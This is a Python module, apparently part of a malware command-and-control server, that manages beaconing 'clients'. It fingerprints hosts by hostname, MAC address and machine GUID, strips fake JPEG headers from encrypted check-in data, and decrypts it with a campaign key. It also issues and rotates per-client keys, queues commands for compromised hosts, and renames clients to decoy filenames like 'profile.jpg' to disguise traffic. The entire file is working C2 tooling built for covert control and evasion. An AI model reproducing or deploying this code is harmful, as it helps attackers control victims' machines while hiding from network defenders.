import os
import base64
import logging
from datetime import datetime
import json
import re
import string
import random

logger = logging.getLogger(__name__)

class ClientHelper:
    # Class variable to store client names across all instances
    _client_names = None
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
        self._load_client_names()
    
    def _load_client_names(self):
        """Load possible client names from client_names.txt file once"""
        # Only load if the class variable is None
        if ClientHelper._client_names is None:
            # Set default fallback
            ClientHelper._client_names = ["default-img.jpeg"]
            
            try:
                # Find the client_names.txt file path
                script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                names_file = os.path.join(script_dir, "helpers", "links", "client_names.txt")
                
                if os.path.exists(names_file):
                    with open(names_file, 'r') as f:
                        names = [line.strip() for line in f if line.strip()]
                    
                    if names:
                        ClientHelper._client_names = names
                        logger.info(f"Loaded {len(names)} client names from {names_file}")
                    else:
                        logger.warning(f"No client names found in {names_file}, using defaults")
                else:
                    logger.warning(f"Client names file not found at {names_file}, using defaults")
                    # Create some default options
                    ClientHelper._client_names = [
                        "profile.jpg", "document.pdf", "config.json", "data.csv", 
                        "script.js", "style.css", "image.png", "icon.ico"
                    ]
            except Exception as e:
                logger.error(f"Error loading client names: {e}")
        
        # Use the class variable
        self.client_names = ClientHelper._client_names
    
    def identify_client_from_body(self, client_ip, client_id_from_body, system_info_raw=None):
        """
        Identify a client based on client ID provided in request body
        
        Args:
            client_ip: IP address of the client
            client_id_from_body: Client ID extracted from request body
            system_info_raw: Raw system info data (could be encrypted)
            
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        system_info = {}
        newly_identified = False
        first_contact = False
        
        # Use the client ID from the body if provided
        client_id = client_id_from_body
        
        # If no client ID was provided, use IP as fallback
        if not client_id:
            client_id = client_ip
            logger.warning(f"No client ID provided, using IP address {client_ip} as identifier")
        
        # Original client ID (will be updated if needed based on system info)
        original_client_id = client_id
        
        # Process system info if available
        if system_info_raw:
            try:
                # Check for and remove JPEG headers if present
                if isinstance(system_info_raw, str):
                    # Strip JPEG header prefixes (exact match only to avoid breaking the data)
                    if system_info_raw.startswith("0xFFD8FF"):
                        system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
                        logger.info(f"Removed JPEG header prefix '0xFFD8FF' from data")
                    elif system_info_raw.startswith("FFD8FF"):
                        system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
                        logger.info(f"Removed JPEG header prefix 'FFD8FF' from data")
                
                # Try to decrypt the system info if it doesn't look like JSON
                system_info_json = system_info_raw
                
                if not isinstance(system_info_raw, dict) and not (isinstance(system_info_raw, str) and system_info_raw.startswith('{')):
                    try:
                        # Try with client-specific key if available
                        if client_id and self._has_unique_key(client_id):
                            system_info_json = self.crypto_helper.decrypt(system_info_raw, client_id)
                        else:
                            # Fall back to campaign key
                            system_info_json = self.crypto_helper.decrypt(system_info_raw)
                    except Exception as e:
                        logger.warning(f"Could not decrypt system info: {e}")
                        # Try to use it as-is if decryption fails
                
                # Parse the system info JSON
                try:
                    if isinstance(system_info_json, str):
                        system_info_obj = json.loads(system_info_json)
                    else:
                        system_info_obj = system_info_json
                        
                    # Extract properties from system info
                    hostname = system_info_obj.get('Hostname', 'Unknown')
                    ip = system_info_obj.get('IP', client_ip)
                    system_info = system_info_obj
                    
                    logger.info(f"Extracted system info - Hostname: {hostname}, IP: {ip}")
                    
                    # Check for original client ID in system info
                    if 'OriginalClientId' in system_info_obj:
                        reported_original_id = system_info_obj.get('OriginalClientId')
                        logger.info(f"Client reported original ID: {reported_original_id}")
                        
                        # Get the first in the chain (true original)
                        true_original_id = self.find_true_original_id(reported_original_id)
                        if true_original_id and true_original_id in self.client_manager.clients:
                            # Use the true original ID for tracking
                            original_client_id = true_original_id
                            logger.info(f"Using true original client ID for tracking: {original_client_id}")
                            
                            # Update the client's current ID in our tracking if needed
                            if client_id != reported_original_id and client_id != original_client_id:
                                # Check if we already have a mapping chain that includes this client
                                existing_chain = self.check_existing_chain(client_id)
                                if existing_chain and existing_chain != original_client_id:
                                    # We need to merge two chains - this client belongs to existing_chain
                                    # but now we discovered it's also related to original_client_id
                                    self.merge_client_chains(existing_chain, original_client_id)
                                else:
                                    # Update the client ID mapping, ensuring all IDs point to the original
                                    self.client_manager.update_client_id_mapping(original_client_id, client_id)
                            
                        elif reported_original_id in self.client_manager.clients:
                            # We couldn't find a true original, but the reported original exists
                            original_client_id = reported_original_id
                            logger.info(f"Using reported original client ID for tracking: {original_client_id}")
                            
                            # Update the mapping if needed
                            if client_id != reported_original_id:
                                self.client_manager.update_client_id_mapping(reported_original_id, client_id)
                        else:
                            logger.warning(f"Reported original client ID {reported_original_id} not found in client manager")
                            # Keep using the current ID
                except Exception as e:
                    logger.error(f"Error parsing system info: {str(e)}")
                    # Keep client_id but use minimal system info
                    system_info = {"Hostname": "Unknown", "IP": client_ip}
                
                # Check if this is a known client via the current ID
                if client_id in self.client_manager.clients:
                    logger.info(f"Recognized client by current ID {client_id} from {client_ip}")
                    
                    # Check if this client has an original ID recorded
                    if "original_client_id" in self.client_manager.clients[client_id]:
                        # Use the recorded original ID for tracking
                        recorded_original_id = self.client_manager.clients[client_id]["original_client_id"]
                        
                        # Find the true original ID by tracing the chain
                        true_original_id = self.find_true_original_id(recorded_original_id)
                        
                        if true_original_id and true_original_id in self.client_manager.clients:
                            original_client_id = true_original_id
                            logger.info(f"Using true original client ID for internal tracking: {original_client_id}")
                    
                    # Check if this client needs a key
                    if not self._has_unique_key(client_id) and not self._has_unique_key(original_client_id):
                        first_contact = True
                
                # Check if we need to find the client by a rotated ID mapping
                elif original_client_id != client_id:
                    # We're already tracking this via original_client_id
                    logger.info(f"Mapped rotated client ID {client_id} to original ID {original_client_id}")
                    
                    if not self._has_unique_key(original_client_id):
                        first_contact = True
                else:
                    # Check if this is a previously known client that's reconnecting with a new ID
                    # by using machine identifiers like hostname, IP, etc.
                    possible_match = self.find_client_by_identifiers(system_info)
                    
                    if possible_match:
                        # Found a matching client based on system info
                        original_client_id = possible_match
                        logger.info(f"Identified client as returning client {possible_match} based on system identifiers")
                        
                        # Update the mapping to include this new ID
                        self.client_manager.update_client_id_mapping(original_client_id, client_id)
                        
                        # Check if key rotation is needed
                        if not self._has_unique_key(original_client_id):
                            first_contact = True
                    else:
                        # Truly new client
                        newly_identified = True
                        first_contact = True
                        logger.info(f"New client with ID {client_id} from {client_ip}")
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Use client_id from body but minimal system info
                system_info = {"Hostname": "Unknown", "IP": client_ip}
        else:
            # No system info provided, use minimal info
            system_info = {"Hostname": "Unknown", "IP": client_ip}
        
        # Register or update the client with the simplified info
        self.client_manager.add_client(
            ip=client_ip,
            hostname=system_info.get("Hostname", "Unknown"),
            system_info=system_info,
            client_id=original_client_id,  # Use the original ID for internal tracking
            current_id=client_id if original_client_id != client_id else None  # Only set if it's different
        )
        
        return original_client_id, system_info, newly_identified, first_contact
    
    def find_true_original_id(self, client_id):
        """
        Recursively trace back through the client ID chain to find the first original ID
        
        Args:
            client_id: The client ID to start the search from
            
        Returns:
            The true original client ID or None if not found
        """
        if not client_id or client_id not in self.client_manager.clients:
            return client_id  # Return the input if it's not in our database
                
        visited_ids = set()  # To detect cycles
        current_id = client_id
        
        # Limit the chain depth to prevent infinite loops
        max_depth = 10
        depth = 0
        
        while current_id and current_id in self.client_manager.clients and depth < max_depth:
            depth += 1
            
            # Check for cycles
            if current_id in visited_ids:
                logger.warning(f"Detected cycle in client ID chain starting with {client_id}")
                break
                    
            visited_ids.add(current_id)
            
            # Get the recorded original ID for this client
            original_id = self.client_manager.clients[current_id].get("original_client_id")
            
            # If it's the same as current or not set, we've reached the start of the chain
            if not original_id or original_id == current_id:
                return current_id
                    
            # Continue tracing back
            current_id = original_id
                
        # Return the last valid ID in the chain
        return current_id  # This is either the original ID or the last valid one we found
    
    def check_existing_chain(self, client_id):
        """
        Check if this client ID is already part of a chain
        
        Args:
            client_id: The client ID to check
            
        Returns:
            The true original ID of the chain this client belongs to, or None
        """
        if not client_id or client_id not in self.client_manager.clients:
            return None
            
        # If this client has an original_client_id set, it's already part of a chain
        if "original_client_id" in self.client_manager.clients[client_id]:
            original_id = self.client_manager.clients[client_id].get("original_client_id")
            if original_id and original_id != client_id:
                # Find the true original by tracing back
                return self.find_true_original_id(original_id)
                
        # Check if this client is itself an original for any other clients
        for cid, info in self.client_manager.clients.items():
            if info.get("original_client_id") == client_id and cid != client_id:
                # This client is an original for other clients
                return client_id
                
        return None
    
    def merge_client_chains(self, chain1_id, chain2_id):
        """
        Merge two client ID chains by making all clients in chain2 point to the original of chain1
        
        Args:
            chain1_id: The true original ID of the first chain
            chain2_id: The true original ID of the second chain
        """
        if chain1_id == chain2_id:
            return  # Nothing to merge
            
        # Find all clients that are part of chain2
        chain2_clients = []
        for cid, info in self.client_manager.clients.items():
            if info.get("original_client_id") == chain2_id or cid == chain2_id:
                chain2_clients.append(cid)
                
        # Update all chain2 clients to point to chain1
        for cid in chain2_clients:
            if cid != chain1_id:  # Don't point to itself
                self.client_manager.clients[cid]["original_client_id"] = chain1_id
                logger.info(f"Merged client chain: {cid} now points to {chain1_id} (was in chain of {chain2_id})")
        
        # Update any client that was pointing to chain2_id to point to chain1_id
        for cid, info in self.client_manager.clients.items():
            if info.get("original_client_id") == chain2_id:
                info["original_client_id"] = chain1_id
                logger.info(f"Updated client {cid} to point to merged chain original {chain1_id}")
        
        # Mark chain2 as part of chain1
        if chain2_id in self.client_manager.clients:
            self.client_manager.clients[chain2_id]["original_client_id"] = chain1_id
            logger.info(f"Chain original {chain2_id} now points to primary chain original {chain1_id}")
    
    def find_client_by_identifiers(self, system_info):
        """
        Find a client based on system identifiers like machine GUID, hostname, etc.
        
        Args:
            system_info: Dictionary of system information
            
        Returns:
            The client ID of a matching client, or None if no match found
        """
        if not system_info:
            return None
            
        # Extract key identifiers
        hostname = system_info.get("Hostname", "Unknown")
        ip = system_info.get("IP", "Unknown")
        mac_address = system_info.get("MacAddress", "Unknown")
        machine_guid = system_info.get("MachineGuid", "Unknown")
        
        # Skip if we don't have enough identifiers
        if hostname == "Unknown" and ip == "Unknown" and mac_address == "Unknown" and machine_guid == "Unknown":
            return None
            
        # Check each client for matching identifiers
        best_match = None
        best_match_score = 0
        
        for client_id, info in self.client_manager.clients.items():
            score = 0
            client_system_info = info.get("system_info", {})
            
            # Check Machine GUID (strongest identifier)
            if machine_guid != "Unknown" and machine_guid == client_system_info.get("MachineGuid"):
                score += 10
                
            # Check MAC address (strong identifier)
            if mac_address != "Unknown" and mac_address == client_system_info.get("MacAddress"):
                score += 5
                
            # Check hostname (moderately strong identifier)
            if hostname != "Unknown" and hostname == client_system_info.get("Hostname"):
                score += 3
                
            # Check IP (weakest identifier as it can change)
            if ip != "Unknown" and ip == info.get("ip"):
                score += 1
                
            # If this is a better match than previous
            if score > best_match_score:
                best_match_score = score
                best_match = client_id
                
        # Only return if we have a reasonably good match
        if best_match_score >= 5:  # Require at least MAC address match or better
            return self.find_true_original_id(best_match)
            
        return None
    
    def verify_client(self, client_id, system_info):
        """
        Verify client identity - simplified for the new ID format
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        # For our simplified approach, consider clients verified after first contact
        is_verified = True
        confidence = 100.0  # High confidence
        warnings = []
        
        # Update client verification status
        self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
        
        # Check if client needs key rotation
        has_unique_key = self._has_unique_key(client_id)
        
        # Check for manual key rotation request
        requested_key_rotation = any(
            cmd.get('command_type') == 'key_rotation' 
            for cmd in self.client_manager.get_pending_commands(client_id)
        )
        
        # Always issue a unique key on first connection
        needs_key_rotation = (not has_unique_key or requested_key_rotation)
        
        # Log key rotation status
        if requested_key_rotation:
            logger.info(f"Manual key rotation requested for client {client_id}")
        elif not has_unique_key:
            logger.info(f"First contact with client {client_id} - key issuance needed")
        
        # Register client information for future reference if client_verifier exists
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            self.server.client_verifier.register_client(client_id, system_info)
        
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def prepare_client_id_rotation(self, client_id):
        """
        Prepare a client ID rotation command
        
        Returns:
            dict: Client ID rotation command object
        """
        # Select a random client ID from available options
        # Make sure we don't reuse the current one
        current_client_id = None
        
        if client_id in self.client_manager.clients:
            client_info = self.client_manager.clients[client_id]
            current_client_id = client_info.get('current_client_id')
            
            # Increment the rotation commands sent counter
            client_info['rotation_commands_sent'] = client_info.get('rotation_commands_sent', 0) + 1
        
        new_client_id = self._generate_new_client_id(exclude=current_client_id)
        
        # Store the mapping between original and current ID
        self.client_manager.update_client_id_mapping(client_id, new_client_id)
        
        # Create client ID rotation command
        rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "client_id_rotation",
            "args": new_client_id
        }
        
        logger.info(f"Client ID rotation command issued for client {client_id} -> {new_client_id}")
        
        return rotation_command
    
    def _generate_new_client_id(self, exclude=None):
        """Generate a new client ID from the available options"""
        available_names = [name for name in self.client_names]
        
        # Remove the excluded ID if provided
        if exclude and exclude in available_names:
            available_names.remove(exclude)
        
        # If we're somehow out of options, generate a random one
        if not available_names:
            random_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
            return f"{random_id}-img.jpeg"
        
        # Select a random name
        return random.choice(available_names)
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier (original ID)
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # If there are no pending commands and client_id is an original ID,
        # check if there are pending commands under a current ID
        if not commands and client_id in self.client_manager.get_clients_info():
            current_id = self.client_manager.get_clients_info()[client_id].get('current_client_id')
            if current_id and current_id != client_id:
                # Check if there are any commands for the current ID
                current_commands = self.client_manager.get_pending_commands(current_id)
                if current_commands:
                    # Transfer commands to the original ID
                    for cmd in current_commands:
                        self.client_manager.add_command(
                            client_id, 
                            cmd.get('command_type', 'unknown'), 
                            cmd.get('args', '')
                        )
                    
                    # Clear commands from the current ID
                    self.client_manager.clear_pending_commands(current_id)
                    
                    # Get updated command list
                    commands = self.client_manager.get_pending_commands(client_id)
        
        # Check if there's a pending ID rotation command that hasn't been delivered
        # This handles cases where rotations might have been missed
        has_id_rotation_pending = False
        for command in commands:
            if command.get('command_type') == 'client_id_rotation':
                has_id_rotation_pending = True
                break
        
        # Check if there was a pending rotation that failed to apply
        # This is indicated by a client still using its original ID after a rotation was sent
        if not has_id_rotation_pending and client_id in self.client_manager.clients:
            client_info = self.client_manager.clients[client_id]
            
            # If previous rotation commands were sent but not applied, create a new rotation
            if (client_info.get('rotation_commands_sent', 0) > 0 and 
                (not client_info.get('current_client_id') or 
                 client_info.get('current_client_id') == client_id)):
                logger.info(f"Previous rotation for {client_id} seems to have failed, preparing new rotation")
                
                # Create a fresh rotation command
                rotation_command = self.prepare_client_id_rotation(client_id)
                # Insert at the beginning of commands
                commands.insert(0, rotation_command)
                
                # Reset missed rotation counter
                client_info['rotation_commands_sent'] = 0
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        # Check if there's a client ID rotation command and move it after key rotation 
        # (since key rotation needs to happen first)
        has_id_rotation = False
        for i, command in enumerate(commands):
            if command.get('command_type') == 'client_id_rotation':
                has_id_rotation = True
                # If there is a key rotation (which will be at position 0), 
                # move the ID rotation to position 1
                if has_key_operation and i > 1:
                    commands.insert(1, commands.pop(i))
                # If there's no key rotation but the ID rotation isn't at position 0, 
                # move it there
                elif not has_key_operation and i > 0:
                    commands.insert(0, commands.pop(i))
                break
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands 
                                if cmd.get('command_type') != 'key_rotation' 
                                and cmd.get('command_type') != 'client_id_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )